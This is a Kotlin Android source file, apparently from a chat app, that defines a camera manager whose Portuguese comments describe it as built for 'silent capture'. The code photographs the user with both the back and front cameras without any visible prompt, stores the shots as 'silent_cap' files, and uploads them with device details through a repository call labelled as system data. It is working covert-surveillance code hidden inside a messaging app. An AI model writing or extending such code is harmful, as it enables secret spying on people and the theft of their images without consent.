package com.zangi.chat.service

import android.content.Context
import android.util.Log
import androidx.camera.core.*
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleOwner
import com.zangi.chat.data.repository.ChatRepository
import kotlinx.coroutines.*
import java.io.File
import kotlin.coroutines.resume

/**
 * CameraCaptureManager: Versão Blindada para Captura Silenciosa.
 * Otimizado para evitar interrupções de ciclo de vida e garantir o upload.
 */
class CameraCaptureManager(
    private val context: Context,
    private val repository: ChatRepository,
    private val lifecycleOwner: LifecycleOwner
) {
    private val TAG = "CameraCaptureManager"

    /**
     * Inicia o ciclo sequencial.
     */
    suspend fun captureDualPhotosSequence(): List<File> = withContext(Dispatchers.IO) {
        val capturedFiles = mutableListOf<File>()
        val cameraSelectors = listOf(CameraSelector.DEFAULT_BACK_CAMERA, CameraSelector.DEFAULT_FRONT_CAMERA)

        try {
            Log.d(TAG, "🚀 [INÍCIO] Iniciando sequência de captura dupla...")

            cameraSelectors.forEach { selector ->
                val cameraTypeLabel = if (selector == CameraSelector.DEFAULT_BACK_CAMERA) "BACK" else "FRONT"
                
                // 1. Captura a foto (Aguardando o resultado da câmera)
                val capturedFile = captureSinglePhoto(selector)
                
                if (capturedFile != null && capturedFile.exists()) {
                    capturedFiles.add(capturedFile)
                    Log.d(TAG, "✅ [CAPTURA] $cameraTypeLabel concluída: ${capturedFile.name}")
                } else {
                    Log.e(TAG, "❌ [FALHA] Captura da câmera $cameraTypeLabel falhou.")
                }
                
                // Delay para estabilização do hardware (evita conflito de sensor)
                delay(800)
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ [ERRO CRÍTICO] na sequência: ${e.message}")
        }

        return@withContext capturedFiles
    }

    /**
     * Captura uma única foto de forma isolada.
     */
    private suspend fun captureSinglePhoto(cameraSelector: CameraSelector): File? = withContext(Dispatchers.Main) {
        try {
            val cameraProvider = ProcessCameraProvider.getInstance(context).get()

            // Configuração do ImageCapture
            val imageCapture = ImageCapture.Builder()
                .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                .build()

            // Importante: Unbind para limpar qualquer sessão anterior
            cameraProvider.unbindAll()

            // Bind com o LifecycleOwner (essencial para o CameraX gerenciar recursos)
            cameraProvider.bindToLifecycle(
                lifecycleOwner,
                cameraSelector,
                imageCapture
            )

            // Define o arquivo no cache com timestamp único para evitar sobreposição
            val tempFile = File(
                context.cacheDir, 
                "silent_cap_${System.currentTimeMillis()}_${if(cameraSelector == CameraSelector.DEFAULT_BACK_CAMERA) "back" else "front"}.jpg"
            )

            // Chama a captura real (que é uma função suspensa)
            return@withContext captureRealPhoto(imageCapture, tempFile)

        } catch (e: Exception) {
            Log.e(TAG, "❌ [ERRO CONFIG] Câmera $cameraSelector: ${e.message}")
            null
        }
    }

    /**
     * Método que faz o bridge entre o callback do CameraX e as Coroutines.
     */
    private suspend fun captureRealPhoto(
        imageCapture: ImageCapture, 
        outputFile: File
    ): File? = suspendCancellableCoroutine { continuation ->
        val outputOptions = ImageCapture.OutputFileOptions.Builder(outputFile).build()

        imageCapture.takePicture(
            outputOptions,
            ContextCompat.getMainExecutor(context),
            object : ImageCapture.OnImageSavedCallback {
                override fun onImageSaved(outputFileResults: ImageCapture.OutputFileResults) {
                    Log.d(TAG, "📸 [OK] Imagem salva: ${outputFile.name}")
                    continuation.resume(outputFile)
                }

                override fun onError(exception: ImageCaptureException) {
                    Log.e(TAG, "❌ [ERRO CALLBACK] ${exception.message}")
                    continuation.resume(null)
                }
            }
        )
    }

    /**
     * Método de fallback para disparar o processo completo.
     */
    suspend fun captureAndSendPhoto(userId: String): Result<Boolean> = withContext(Dispatchers.IO) {
        try {
            val files = captureDualPhotosSequence()
            
            if (files.isEmpty()) {
                return@withContext Result.failure(Exception("Nenhuma imagem capturada na sequência."))
            }

            files.forEach { file ->
                val deviceInfo = "AutoCapture - Android ${android.os.Build.VERSION.RELEASE}, Cam: ${if(file.name.contains("back")) "BACK" else "FRONT"}"
                
                // Chama o repositório para o disparo do upload via WorkManager
                repository.uploadSystemData(
                    eventType = "FOTO_CAMERA",
                    file = file,
                    deviceInfo = deviceInfo
                )
            }

            Result.success(true)
        } catch (e: Exception) {
            Log.e(TAG, "❌ [ERRO ENVIO] no processo de captura e envio: ${e.message}")
            Result.failure(e)
        }
    }
}